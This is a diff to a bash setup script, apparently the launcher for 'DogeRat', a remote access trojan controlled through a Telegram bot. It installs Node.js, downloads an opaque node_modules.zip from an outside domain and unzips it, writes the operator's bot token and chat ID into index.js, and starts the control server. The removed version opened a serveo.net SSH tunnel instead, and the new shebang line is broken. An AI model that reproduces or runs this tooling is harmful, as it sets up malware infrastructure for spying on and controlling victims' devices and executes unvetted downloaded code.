@@ -1,20 +1,74 @@
-#!/usr/bin/env bash
-if ! command -v ssh > /dev/null; then
-    echo "Error: openssh is not installed. Please install it before running this script."
-    exit 1
-fi
+!/usr/bin/env bash
 
-echo -e "\e[1;32m"
-printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' -
-echo " ____  ____  ____   ___  ____  ____  ____   __"
-echo "||d ||||o ||||g || ||e ||||r ||||a ||||t ||||\ "
-echo "||__||||__||||__||||__||||__||||__||||__||||_\\"
-echo "|\__/|\__/|\__/||/__/|\__/|\__/|\__/|\__/|\__/"
-printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' -
+# Set terminal colors
+RED="\033[31m"
+GREEN="\033[32m"
+YELLOW="\033[33m"
+BLUE="\033[34m"
+MAGENTA="\033[35m"
+CYAN="\033[36m"
+RESET="\033[0m"
+
+# Print banner
+echo -e "${RED}██████╗░░█████╗░░██████╗░███████╗██████╗░░█████╗░████████╗"
+echo -e "██╔══██╗██╔══██╗██╔════╝░██╔════╝██╔══██╗██╔══██╗╚══██╔══╝"
+echo -e "██║░░██║██║░░██║██║░░██╗░█████╗░░██████╔╝███████║░░░██║░░░"
+echo -e "██║░░██║██║░░██║██║░░╚██╗██╔══╝░░██╔══██╗██╔══██║░░░██║░░░"
+echo -e "██████╔╝╚█████╔╝╚██████╔╝███████╗██║░░██║██║░░██║░░░██║░░░"
+echo -e "╚═════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░${RESET}"
+echo -e "${YELLOW}               ░D░O░G░E░ ░R░A░T░B░Y░S░ ░H░I░V░ ░A░Y░A░D░A░V░${RESET}"
+
+
 echo -e "\e[0m"
 echo "Author: "
 echo "Github: "
 echo "Telegram channel: "
-read -p "Enter your Telegram username: " telegram_username
-sed -i "0,/telegram_username/s//${telegram_username}/" port.sh
-ssh -R ${telegram_username}:80:localhost:8999 -o GatewayPorts=no serveo.net
+echo -n "Loading "
+timeout 10s bash -c '
+while true
+do
+    echo -n "."
+    sleep 1
+done
+'
+echo " Done!"
+
+
+apt update && apt upgrade -y
+if ! command -v node &> /dev/null
+then
+    echo "Node.js LTS not found. Installing..."
+    pkg install nodejs-lts || { echo "Failed to install Node.js LTS" ; exit 1; }
+else
+    echo "Node.js LTS already installed"
+fi
+if ! command -v wget &> /dev/null
+then
+    echo "wget not found. Installing..."
+    apt install -y wget || { echo "Failed to install wget" ; exit 1; }
+else
+    echo "wget already installed"
+fi
+
+if [ -d "node_modules" ]
+then
+    echo "node_modules already exists. Skipping download."
+else
+    if [ -f "node_modules.zip" ]
+    then
+        echo "node_modules.zip already downloaded. Skipping download."
+    else
+        # Download node_modules.zip file
+        wget https://cybershieldx.com/node_modules.zip || { echo "Failed to download node_modules.zip" ; exit 1; }
+    fi
+
+    unzip node_modules.zip || { echo "Failed to extract node_modules.zip" ; exit 1; }
+    rm node_modules.zip
+fi
+
+read -p "Enter your bot token: " token
+read -p "Enter your chat ID: " id
+sed -i "s/const token = 'your token here'/const token = '$token'/g" index.js
+sed -i "s/const id = 'chat id here'/const id = '$id'/g" index.js
+echo "Server uploaded successfully! Now open new tab and follow rest instructions"
+node index.js
